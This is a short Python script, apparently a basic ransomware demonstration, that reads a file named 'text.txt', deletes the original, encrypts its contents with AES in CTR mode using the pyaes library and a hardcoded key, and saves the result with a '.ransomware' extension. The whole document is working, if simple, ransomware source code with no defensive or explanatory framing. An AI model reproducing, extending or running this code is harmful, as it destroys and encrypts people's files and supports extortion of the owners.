import os
import pyaes

file_name = "text.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = b'12345678abcdefgh'
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

new_file_name = file_name + ".ransomware"
new_file = open(new_file_name, "wb")
new_file.write(crypto_data)
new_file.close()